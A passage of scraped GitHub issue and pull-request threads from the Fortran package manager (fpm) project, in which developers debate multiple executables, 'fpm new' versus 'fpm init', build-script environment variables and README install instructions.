                    "text": "Hi @ivan-pi, regarding multiple drivers I believe the current fpm behaviour allows only one executable source file per folder, where any other Fortran files in that same folder are assumed to be modules; this is undocumented I think because the behaviour is still under discussion, see #91 - the suggestion there by @certik seems promising.\n\nA remaining point might be that after doing stack install in the fpm folder, the ${HOME}/.local/bin/ folder might not be on the path already, requiring an extra command export PATH=\"$PATH:$HOME/.local/bin/\".\n\nThis is a good point and should probably be added to the README."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-06-22 09:27:29+00:00",
                    "text": "Thanks @LKedward  for pointing me to the previous discussion. It seems that this issue is then a duplicate. @everythingfunctional and @certik, should I close this issue and comment in #91 instead?\n\nThis is a good point and should probably be added to the README.\n\nI will create a pull request in the next day or two."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 22:06:03+00:00",
                    "text": "Hi @ivan-pi , thanks for trying out fpm with your project. You can have more than one executable per project, but as @LKedward pointed out you must have them in separate folders. Not that the entry in the toml file starts as [[executable]] instead of [[driver]], or it seemed like you considered these to be test programs, so you may want to specify them with [[test]].\nAs for the compiler flags, we haven't really gotten a good handle on how to deal with those. The problem mostly comes from what to do with them in terms of dependencies. Does a project's dependencies get compiled with the flags it specified? What about projects that depend on it? What about if you switch compilers? It's on our radar, it's just a really hard problem that we haven't tackled yet.\nYou can close this issue if you feel the other adequately covers it. Also, feel free to open up other issues if you want make sure we keep track of anything else you asked here."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:20:36+00:00",
                    "text": "I believe Cargo supports to have multiple main programs in the bin directory. I think we agreed to use an app directory instead of bin. Is there a reason why fpm cannot compile those automatically?\nIt is intuitive and natural. I would expect it to work also."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 22:35:36+00:00",
                    "text": "It's not that we can't support it, it just makes things more complicated than \"everything else in this folder is a module that should be compiled and linked in\".\nWe (sort of) support having multiple programs in the app directory, they just have to be in separate sub-folders and have explicit entries in fpm.toml."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:39:44+00:00",
                    "text": "Yes, it's a little more complicated, but it makes life so much easier for the end user. That is the whole point of fpm. :)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 23:54:46+00:00",
                    "text": "Yeah, that's probably true."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-23 16:07:50+00:00",
                    "text": "fpm init could generate the appropriate [[executable]] sections for the user. Just throwing an idea out there, not something that I think is a priority."
                },
                {
                    "user": "certik",
                    "date": "2020-06-23 18:18:43+00:00",
                    "text": "Cargo does not require any modifications to Cargo.toml to have executables. We should not either. So fpm init just produces the default initial fpm.toml, and users don't need to touch it, they just create the app dir and put programs in it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-23 18:43:16+00:00",
                    "text": "Yes, the sane default of multiple programs in app/ is what we should aim for.\nMy comment about fpm init was specific to the scenario of multiple programs in custom (non-default) location, which needs to be specified in the toml file, just like Cargo does.\nI actually didn't know (or forgot) that we supported multiple executables by specifying them in fpm.toml, so I was happy to read about it in this thread."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-07 18:08:02+00:00",
                    "text": "Yes, it's a little more complicated, but it makes life so much easier for the end user. That is the whole point of fpm. :)\n\nYes, that will great !!\nalias gardhor"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-19 19:24:36+00:00",
                    "text": "Is this issue still relevant?\nI recall @LKedward mentioning somewhere that my fortran_lsp repo could be built fpm, meaning that this has been resolved."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-22 09:27:46+00:00",
                    "text": "Hi @ivan-pi, yes I believe this issue is now solved."
                }
            ]
        },
        {
            "number": 104,
            "user": "certik",
            "date": "2020-06-20 23:01:41+00:00",
            "title": "Remove the space before comma",
            "text": "This is a fixup of #101.",
            "comments": []
        },
        {
            "number": 103,
            "user": "EverLookNeverSee",
            "date": "2020-06-20 19:53:09+00:00",
            "title": "ENH: Using OpenMP in stdlib",
            "text": "Hi there\nI started learning OpenMP couple weeks ago and would like to use it to parallelize and speed up fortran standard library codebase.",
            "comments": []
        },
        {
            "number": 102,
            "user": "everythingfunctional",
            "date": "2020-06-19 03:36:59+00:00",
            "title": "Enable fpm to create a new package",
            "text": "This is just the bare minimum I would say is necessary for fpm new.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 13:56:15+00:00",
                    "text": "A minor observation: I expected the behaviour to be to initialise a project in the current directory (like git init), as opposed to the command creating a new directory - but I think that is just something that needs documenting somewhere for users.\n\nThis (fpm new) behaviour is analogous to cargo new, and what you describe is analogous to cargo init. So if we wanted to have this, it would be covered by fpm init."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-19 14:56:51+00:00",
                    "text": "Yeah, I'll add some documentation to the README, and maybe PACKAGING.md"
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 17:33:44+00:00",
                    "text": "I believe this should be called init.\n\nFurthermore, it should initialize in the current directory without an argument, or create a new directory with an argument, just like git or Cargo.\n\nLet's keep the UI as similar to others established tools as possible.\n\u2026\nOn Fri, Jun 19, 2020, at 8:57 AM, Brad Richardson wrote:\n\n\n Yeah, I'll add some documentation to the README, and maybe PACKAGING.md\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVVJAAHKPTZZ565HTRXN4EFANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 18:03:24+00:00",
                    "text": "@certik, see cargo new and cargo init.\nIn short, cargo new (and likewise, fpm new) creates a new directory and initializes the TOML and starter source files. I think this is what this PR implements, but again, without a PR description or some example in the documentation, hard to say. @everythingfunctional can you please describe the behavior with a small example? How is this invoked? What files are created?\ncargo init initializes the package in an existing directory with existing source files. So fpm init will be used to \"fpm-ize\" an existing package that obeys the fpm layout. fpm new is used to bootstrap a new empty package. They're different.\nAt least this is my understanding of it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 18:04:54+00:00",
                    "text": "@everythingfunctional can you please describe the behavior with a small example? How is this invoked? What files are created?\n\nSorry, I didn't mean to nag. :) I saw your earlier response after writing this."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:26:07+00:00",
                    "text": "No, cargo init creates a new package in the current directory and cargo init b creates a new package in a new directory b. I am not sure what the difference is to cargo new. But I've only used cargo init and it creates a new package from scratch."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:27:04+00:00",
                    "text": "See #96 where I go into all the details. See also #96 (comment)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:31:06+00:00",
                    "text": "Both cargo new and cargo init seem identical to me. They both initialize in you current directory, or in a new directory if you provide it as an argument. The initialized files seem identical. What is the difference between the two?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 19:19:21+00:00",
                    "text": "cargo new only creates a new directory and initializes a project in it.\ncargo init initializes a project in an existing directory, and optionally does what cargo new does.\nFor cargo new, PATH is required. For cargo init, PATH is optional.\nIndeed, if starting from scratch, they appear very much the same and redundant.\nHowever, if there is anything special about the directory layout (multiple binaries, tests etc.) and contents that would be reflected in Cargo.toml, I would expect cargo init to do that. But I don't think it does, at least in the simple example I tried.\nFor fpm it should. For example, if you have a package layout with multiple programs, fpm init should be able to output a correct fpm.toml according to the special layout.\nfpm new simply bootstraps something from scratch.\nIt's very nice and useful to use Cargo and Rust for reference, but it's not an end all. We're not targeting Rust users. What we make should make sense to us. fpm new for a new project very much makes sense, and fpm init makes more sense for initializing an existing project."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 20:45:20+00:00",
                    "text": "For me it makes sense to use \"fpm init\" like \"git init\". Create a new project from scratch.\n\nI don't think by default it should do something different based on an existing project. However let's have it as an option.\n\nWe should optimize for the most common use case. I think that would be to start a new project from scratch.\n\nAlso, let's have only one command, init. Having two seems redundant and confusing.\n\u2026\nOn Fri, Jun 19, 2020, at 1:19 PM, Milan Curcic wrote:\n\n\n `cargo new` only creates a new directory and initializes a project in it.\n\n `cargo init` initializes a project in an existing directory, and\n optionally does what `cargo new` does.\n\n For `cargo new`, `PATH` is required. For `cargo init`, `PATH` is optional.\n\n Indeed, if starting from scratch, they appear very much the same and redundant.\n\n However, if there is anything special about the directory layout\n (multiple binaries, tests etc.) and contents that would be reflected in\n Cargo.toml, I would expect `cargo init` to do that. But I don't think\n it does, at least in the simple example I tried.\n\n For fpm it should. For example, if you have a package layout with\n multiple programs, `fpm init` should be able to output a correct\n fpm.toml according to the special layout.\n\n `fpm new` simply bootstraps something from scratch.\n\n It's very nice and useful to use Cargo and Rust for reference, but it's\n not an end all. We're not targeting Rust users. What we make should\n make sense to us. `fpm new` for a new project very much makes sense,\n and `fpm init` makes more sense for initializing an existing project.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBLCKEQ6AJ52AAUTJLRXO24NANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 21:19:46+00:00",
                    "text": "For me it makes sense to use \"fpm init\" like \"git init\". Create a new project from scratch.\n\ngit init actually does not only create a new project from scratch. It initializes existing files in the directory into the git repository if there are any. It does also create a new git repository. I think it's difficult to argue that the word \"init\" is more intuitive for creating something new than the word \"new\". To me \"init\" means initialize, which means enable some capability in existing directory+files. In the context of fpm, that would mean simply create fpm.toml given existing pakage layout.\nBut I agree that we shouldn't have redundant commands like Cargo does. It looks like the choice is whether we want to have one command that does multiple things or two narrowly-scoped commands.\n\nWe implement just fpm init which can both create a new empty project and \"fpm-ize\" an existing non-fpm package (basically generate a correct fpm.toml);\nWe implement fpm new that creates an empty project and fpm init to initialize an existing package.\n\nI think @certik prefers option 1. I prefer option 2. as it's easier to understand to me. There may be some other options I missed. @everythingfunctional @LKedward what do you prefer?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 21:24:07+00:00",
                    "text": "An argument for fpm init over fpm new (all else being equal) is that init is a verb and new is a noun. Using a verb would be more consistent with our existing commands (build, install, run, test), and semantically makes more sense (do this with that).\nSo I am not opposed to the word \"init\". But I do prefer smaller utility commands over more general ones that would behave differently depending on current directory."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-19 22:24:39+00:00",
                    "text": "Technically, giti init doesn't create a new project from scratch. It initializes an existing project's git configuration.\nI like having two different commands because they do two different things. fpm new for new projects, and fpm init for existing projects.\nSince the most common use case would be to start a new project from scratch, that's why I implemented it first."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:06:05+00:00",
                    "text": "How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects. So I don't think we should optimize for this rare case.\n\nSo I vote to rename new to init and we are in agreement.\n\u2026\nOn Fri, Jun 19, 2020, at 4:24 PM, Brad Richardson wrote:\n\n\n Technically, `giti init` doesn't create a new project from scratch. It\n initializes an existing project's git configuration.\n\n I like having two different commands because they do two different\n things. `fpm new` for new projects, and `fpm init` for existing\n projects.\n\n Since the most common use case would be to start a new project from\n scratch, that's why I implemented it first.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWFIEEUF4HMPJRLSMM3RXPQTHANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 23:24:53+00:00",
                    "text": "How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n\nI expect that we'll use fpm init quite often in the early days, perhaps even more often than fpm new, as we'll work hard on adapting existing Fortran packages (ours and those of others) into fpm. In the long run, I expect fpm new would be used more often.\nIt also depends how you're used to doing things. I never ever ran git init to create a new repo from scratch. I always run it after I've written and played with some code and want to make a git repo out of it. Same with fpm. For any more complex layout package, I'd much rather run fpm init and have fpm write the fpm.toml for me, than me editing it by hand every time I add a new file.\nEven if it's an edge case and something that we'd want down the road, I think it's useful to carefully design and name things early on."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:53:03+00:00",
                    "text": "I always indeed run \"git init\" on an empty repository to start a new project.\n\nRegarding adding new files, you don't modify fpm.toml when you do that.\n\u2026\nOn Fri, Jun 19, 2020, at 5:25 PM, Milan Curcic wrote:\n\n\n > How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n\n I expect that we'll use `fpm init` quite often in the early days,\n perhaps even more often than `fpm new`, as we'll work hard on adapting\n existing Fortran packages (ours and those of others) into fpm. In the\n long run, I expect `fpm new` would be used more often.\n\n It also depends how you're used to doing things. I never ever ran git\n init to create a new repo from scratch. I always run it after I've\n written and played with some code and want to make a git repo out of\n it. Same with fpm. For any more complex layout package, I'd much rather\n run `fpm init` and have fpm write the fpm.toml for me, than me editing\n it by hand every time I add a new file.\n\n Even if it's an edge case and something that we'd want down the road, I\n think it's useful to carefully design and name things early on.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDWQADEDJQCBLH5LDLRXPXVDANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:54:59+00:00",
                    "text": "More generally, let's follow what Rust does, it's a well tested approach. Once we use it and don't like it, then let's discuss to do something else.\n\u2026\nOn Fri, Jun 19, 2020, at 5:52 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I always indeed run \"git init\" on an empty repository to start a new project.\n\n Regarding adding new files, you don't modify fpm.toml when you do that.\n\n On Fri, Jun 19, 2020, at 5:25 PM, Milan Curcic wrote:\n >\n >\n > > How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n >\n > I expect that we'll use `fpm init` quite often in the early days,\n > perhaps even more often than `fpm new`, as we'll work hard on adapting\n > existing Fortran packages (ours and those of others) into fpm. In the\n > long run, I expect `fpm new` would be used more often.\n >\n > It also depends how you're used to doing things. I never ever ran git\n > init to create a new repo from scratch. I always run it after I've\n > written and played with some code and want to make a git repo out of\n > it. Same with fpm. For any more complex layout package, I'd much rather\n > run `fpm init` and have fpm write the fpm.toml for me, than me editing\n > it by hand every time I add a new file.\n >\n > Even if it's an edge case and something that we'd want down the road, I\n > think it's useful to carefully design and name things early on.\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#102 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWDWQADEDJQCBLH5LDLRXPXVDANCNFSM4OCLLZMQ>.\n >"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-20 02:42:07+00:00",
                    "text": "I honestly didn't even know that git init directory was a valid command. I learned something new today! I always thought you just had to git init inside a directory, existing files or not.\nI still think that the command that makes the most sense for creating a new project is fpm new, even if that's not what Cargo does. Although I will note the following output from cargo, which would seem to suggest that cargo somewhat agrees with me. cargo new is for a new cargo package and cargo init is for in an existing directory.\n[darter:~] cargo help new\ncargo-new \nCreate a new cargo package at <path>\n\nUSAGE:\n    cargo new [OPTIONS] <path>\n\n[darter:~] cargo help init\ncargo-init \nCreate a new cargo package in an existing directory\n\nUSAGE:\n    cargo init [OPTIONS] [--] [path]"
                },
                {
                    "user": "certik",
                    "date": "2020-06-20 17:04:23+00:00",
                    "text": "Here is the guide for Cargo:\nhttps://doc.rust-lang.org/cargo/guide/creating-a-new-project.html\nit seems they recommend cargo new also.\nI explained my position above, Milan and Brad explained theirs, and it looks like they prefer to use fpm new instead of fpm init to start a new package. So unless more people have an opinion right now, let's go with fpm new and move on.\nHowever, I reserve the right to run a poll later on, and if more people prefer fpm init, let's reconsider. Until then, let's do fpm new."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-20 18:21:39+00:00",
                    "text": "However, I reserve the right to run a poll later on, and if more people prefer fpm init, let's reconsider. Until then, let's do fpm new.\n\nDefinitely, we don't have a majority agreement right now."
                }
            ]
        },
        {
            "number": 101,
            "user": "EverLookNeverSee",
            "date": "2020-06-17 11:51:54+00:00",
            "title": "Optional Fix for README",
            "text": "Separating navigating to stack directory and Adding to PATH\nBecause some of users may navigate to stack directory first and and enter this command(export PATH=\"$PATH:pwd/stack-2.1.3-linux-x86_64-static/)  in order to install stack command that causes error below in $PATH:\nNo such file or directory",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-06-17 12:13:30+00:00",
                    "text": "@everythingfunctional This reminds me of a question I wanted to ask about the instructions for installing stack: why does the README recommend following the 'Manual Download' instructions as opposed to using the simpler install script or distribution package managers? I used the Ubuntu distribution package followed by running $ stack upgrade which was much simpler and works fine.\nThe instructions for installing stack are pleasantly comprehensive (and cross-platform!) and I think we should simply refer users to this page and allow them to choose their preferred installation method."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-17 14:40:43+00:00",
                    "text": "I think this is a positive change, as our specific instruction was Linux only.\n\nThank you @milancurcic for approving this PR."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-17 14:45:34+00:00",
                    "text": "Thanks @EverLookNeverSee , I agree this is an improvement.\nUnless Brad had a specific reason for recommending the manual installation method, I think this is good to merge with one change: can you revert 7ee74b1?\n\nOk, I'll revert it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-17 16:20:15+00:00",
                    "text": "@certik wanted to support people who didn't have sudo access to install system wide. I agree that the official stack install instructions are generally the preferred way, so I support this change. We may  want to have a separate section to put the manual install instructions somewhere just in case."
                },
                {
                    "user": "certik",
                    "date": "2020-06-17 20:34:11+00:00",
                    "text": "I would like to keep it in some form, as requiring a sudo access is a non-starter on almost any machine where I would like to use fpm (I don't have sudo access)."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-06-17 20:50:39+00:00",
                    "text": "I would like to keep it in some form, as requiring a sudo access is a non-starter on almost any machine where I would like to use fpm (I don't have sudo access).\n\nI agree. Could this link  just be mentioned to replace the deleted section. Furthermore, all OS are described there."
                },
                {
                    "user": "certik",
                    "date": "2020-06-17 21:43:57+00:00",
                    "text": "I think that link would work."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-20 07:59:48+00:00",
                    "text": "@certik\nWhat should we do for this PR?"
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-21 06:52:32+00:00",
                    "text": "@certik Thanks for merging."
                }
            ]
        },
        {
            "number": 100,
            "user": "milancurcic",
            "date": "2020-06-16 17:52:56+00:00",
            "title": "add a note about Effing Package Management and elaborate on prototype",
            "text": "This PR:\n\nAdds a clarification about the other fpm\nExpands the note on fpm being an early prototype\n\nFixes #90",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-16 18:09:05+00:00",
                    "text": "Minor wording change suggestion, but other than that this looks good. Thanks for tackling this one."
                },
                {
                    "user": "certik",
                    "date": "2020-06-16 18:29:33+00:00",
                    "text": "I would also add at the end:\nAs the prototype matures and we enter production, we will do our best to stay backwards compatible.\n(Otherwise looks good, thanks!)"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-16 18:51:40+00:00",
                    "text": "Thank you, both. Merging."
                }
            ]
        },
        {
            "number": 99,
            "user": "everythingfunctional",
            "date": "2020-06-15 00:11:07+00:00",
            "title": "Add support for Makefiles and generic build scripts",
            "text": "",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 00:33:29+00:00",
                    "text": "I think I might need some help from somebody who understands Windows a bit better to help me with the issue there. I'm guessing either something with the absolute paths is screwing up make, or the environment variables aren't working properly. I'm leaning towards the former, but I don't have access to a Windows machine to test it with at the moment."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 01:00:39+00:00",
                    "text": "The windows error is:\n# gfortran (for build/gfortran_debug/test/main.o)\n# gfortran (for build/gfortran_debug/test/runTests.exe)\n Hello, from test!\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\with_makefile\\build\\gfortran_debug\\with_makefile\\libwith_makefile.a'.  Stop.\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\makefile_complex\\build\\gfortran_debug\\with_makefile\\libwith_makefile.a'.  Stop.\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\makefile_complex\\build\\gfortran_debug\\makefile_complex\\libmakefile_complex.a'.  Stop."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 04:20:47+00:00",
                    "text": "I am worried it's going to mess up buildsystems. Cargo is not using such variables either.\n\u2026\nOn Sun, Jun 14, 2020, at 9:53 PM, Brad Richardson wrote:\n\n\n ***@***.**** commented on this pull request.\n\n In test/example_packages/makefile_complex/Makefile\n <#99 (comment)>:\n\n > @@ -0,0 +1,9 @@\n +INCLUDE_FLAGS = $(addprefix -I,$(INCLUDE_DIRS))\n +\n +$(BUILD_DIR)/libmakefile_complex.a: $(BUILD_DIR)/wrapper_mod.o\n The ones I used are actually the standard environment variables for\n Makefiles. You (almost) can use an empty Makefile and these would\n actually work. We can use prefixed variables, but it's one extra\n difference from what a lot of people will already have and be used to.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#99 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGC5W5YVTCC3G5C4JDRWWLMJANCNFSM4N5VZI5A>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 04:53:46+00:00",
                    "text": "I am worried it's going to mess up buildsystems. Cargo is not using such variables either.\n\nI'm not sure I understand. The environment variables are only set while fpm is running. Can you give me an example of a situation that might break?"
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 05:58:10+00:00",
                    "text": "I'm not sure I understand. The environment variables are only set while fpm is running. Can you give me an example of a situation that might break?\n\nI don't know for sure, but an example would be an autotools build system, that reads these common environment variables, and if they are set by fpm it might break the build. I've definitely seen build systems where things break if you set these variables. So then the user would have to unset them before running autotools.\nIt seems that prefixing them with FPM_, it would ensure that as we expose more variables in the future, things that already work will continue working.\nHowever, one variable I would set automatically, and that is CMAKE_PREFIX_PATH. I think Spack does it, and that makes any CMake project to easily find all the fpm dependencies without the user having to do anything.\nI think your idea is to follow a similar philosophy for raw Make also.\nAlso as a documentation, it's hard to tell from looking at the script who sets the BUILD_DIR variable. But if it is FPM_BUILD_DIR, then it is clear that it is set by fpm.\nI don't know. Let's try this, and keep our options open to possibly prefix it if we run into problems?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 06:16:40+00:00",
                    "text": "My thinking is that if having those environment variables set means your build script doesn't work, that your build script isn't compatible with fpm, and you need a different one for fpm to use. Since the variables aren't persistent after fpm is done running, it won't break existing build systems. They can coexist side by side.\nIf we use prefixed variables, then users are practically guaranteed to have to write a new build script for fpm to use. If we use commonly used ones, there's a chance their existing one might actually work.\nI agree, let's see how this works out, and if we have to change it later, we can.\nI'm not all that familiar with CMake, but we can always do different things for different build tools when we add support for them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 14:53:04+00:00",
                    "text": "My only minor nitpick is with the compounding of Makefiles and build scripts / executables in the fpm.toml definition\n\nI hadn't really thought about it that hard. It's worth considering. Usually I'd agree, but somehow this seemed simpler from a user and documentation stand point. If you have a custom build process, there's one way/place to specify it, and fpm just knows what to do with it.\n@milancurcic or @certik , do you guys have an opinion on this?"
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 17:07:21+00:00",
                    "text": "These are all really tough questions with good arguments on both sides. My only suggestion is to be open and open to change things if things don't feel right. I think the way forward is to insist that we are still in a prototype phase, and so things can (and will) change --- let's put this in bold in the README? And in a prototype phase, let's just try it, and get more experience, and be ready to change things. Only after we declare we are in production, we should be backwards compatible as  much as possible.\nIn general, I was hoping that fpm would simply execute the \"script\" as an executable, and always pass the same environment variables. I feel it is ok for fpm to know how to execute the script properly, so a bash script using bash, a Xonsh script using Xonsh, Make file using make, and an executable as an executable.\nI think it is absolutely ok for users to write a short build script. You will have to do it anyway for cmake projects."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-15 18:10:22+00:00",
                    "text": "I don't see issues with this. Like @certik said, let's try it and we can revise if there's need for it. We can't think of all correct answers ahead of time without trying things first in practice.\nMinor nit pick: As a user I didn't expect that for using make the build_script value would be Makefile or *.mk. build_script = \"make\" or build_script = \"make target\" seems more intuitive, because that's what I would've typed otherwise. However, this is also perhaps problematic because neither Makefile nor make are scripts (Makefile is a specification file and make is a command/tool). Perhaps a build_command parameter would be more appropriate if both arbitrary scripts and make are to be invoked with it."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 19:47:09+00:00",
                    "text": "One issue with build_command is that we need to specify the shell. So it could be Bash on Linux/macOS and PowerShell on Windows. Simple commands like make target would work in both. More advanced things, such as referencing an environment variable will not work cross-platform. Essentially the issue is a lack of cross-platform shell.\nRust / Cargo goes around this by simply writing the \"build script\" in Rust itself, thus making it cross-platform.\nI think there is a huge need for a cross-platform native shell. We even started one: https://github.com/xonsh/minixonsh (Xonsh itself is one, but being a Python program, it has the typical Python issues related to distribution and speed).\nBut until there is one (and well supported), I think we should not just pick one and require it.\nSo given all of this, the two option are:\n\n\nbuild_script would be directly executed in Bash / PowerShell, so you have to use a subset that works in both, such as make or make target. Or bash my_buildscript.sh.\n\n\nbuild_script points to a script or executable that gets executed. So Makefile gets executed via make, as fpm knows this.\n\n\nI still think 2. seems better.\nBut overall, I don't know what the best way forward is. So let's just try something to get moving, and iterate."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-16 02:48:48+00:00",
                    "text": "I think there will be some packages which are just not supported on all platforms, and that's ok. As a community we can encourage that and provide support when we're able, but that's going to be a big hurdle in some instances.\nAs everybody seems to agree, let's try this PR out and see how it goes."
                }
            ]
        },
        {
            "number": 97,
            "user": "epagone",
            "date": "2020-06-13 18:33:53+00:00",
            "title": "add Ubuntu 20.04 package pre-requisite to `README`",
            "text": "Testing the building process, I have identified a pre-requisite on my machine with Ubuntu 20.04. Fixed a trivial typo, too.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-16 17:38:03+00:00",
                    "text": "Merging, thank you @epagone!"
                }
            ]
        },
        {
            "number": 96,
            "user": "certik",
            "date": "2020-06-12 17:08:54+00:00",
            "title": "Implement \"fpm init\" to create the initial project skeleton",
            "text": "It would work just like cargo init:\n$ cargo init myproject1\n     Created binary (application) package\n$ tree -a myproject1\nmyproject1\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 .git\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 config\n\u2502   ...\n\u251c\u2500\u2500 .gitignore\n\u2514\u2500\u2500 src\n    \u2514\u2500\u2500 main.rs\n\n10 directories, 18 files\n\nAs you can see, it starts a git repository, and so on. It is ready to compile, so:\n~$ cd myproject1\nmyproject1(master)$ cat src/main.rs \nfn main() {\n    println!(\"Hello, world!\");\n}\nmyproject1(master)$ cargo run\n   Compiling myproject1 v0.1.0 (/tmp/myproject1)\n    Finished dev [unoptimized + debuginfo] target(s) in 1.25s\n     Running `target/debug/myproject1`\nHello, world!\n\nIf you just call cargo init, then it creates a new project in the current directory. Similar to git init.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:24:33+00:00",
                    "text": "I might split the two use cases and not actually run git init.\nfpm new name creates a folder name with contents fpm.toml, .gitignore and src\\name.f90. Maybe app\\main.f90 instead? Or maybe both? I'll come up with a specific proposal. But yeah, fpm build and maybe fpm run should work from the get go.\nfpm init uses the name of the current folder as the name of the project and just creates fpm.toml. Maybe append build/* to the end of .gitignore.\nI think we want people to be able to create new projects even if they don't already have git installed."
                },
                {
                    "user": "certik",
                    "date": "2020-06-12 18:49:31+00:00",
                    "text": "Yes, we should allow options to configure things, so all of the above will be possible with the proper options. For example to initialize without git:\ncargo init --vcs none myproject1\n\n(Obviously you can use other vcs also such as hg.) People that do not have git can always use this option.\nThe default (with no options provided) should be the ones that people use the most often as well as a \"default\" workflow that we want to encourage. I think that we absolutely want to encourage to use git and upload to GitHub or GitLab. I think that should be the default workflow to encourage.\nBut for people who are perhaps new to programming and just want to use a few dependencies and write some simple app and do not want to learn git at the moment, those would initialize with git init --vcs none myproject1.\n$ cargo init -h\ncargo-init \nCreate a new cargo package in an existing directory\n\nUSAGE:\n    cargo init [OPTIONS] [--] [path]\n\nOPTIONS:\n    -q, --quiet                  No output printed to stdout\n        --registry <REGISTRY>    Registry to use\n        --vcs <VCS>              Initialize a new repository for the given version control system (git, hg, pijul, or\n                                 fossil) or do not initialize any version control at all (none), overriding a global\n                                 configuration. [possible values: git, hg, pijul, fossil, none]\n        --bin                    Use a binary (application) template [default]\n        --lib                    Use a library template\n        --edition <YEAR>         Edition to set for the crate generated [possible values: 2015, 2018]\n        --name <NAME>            Set the resulting package name, defaults to the directory name\n    -v, --verbose                Use verbose output (-vv very verbose/build.rs output)\n        --color <WHEN>           Coloring: auto, always, never\n        --frozen                 Require Cargo.lock and cache are up to date\n        --locked                 Require Cargo.lock is up to date\n        --offline                Run without accessing the network\n    -Z <FLAG>...                 Unstable (nightly-only) flags to Cargo, see 'cargo -Z help' for details\n    -h, --help                   Prints help information\n\nARGS:\n    <path>     [default: .]"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 20:47:11+00:00",
                    "text": "I see, I was not aware of those options for cargo. With that, I'm fine with defaulting to using git. There is certainly value in having the defaults set to the most common use case and the one we want to encourage.\nI would still prefer init and new as two different commands."
                },
                {
                    "user": "milancurcic",
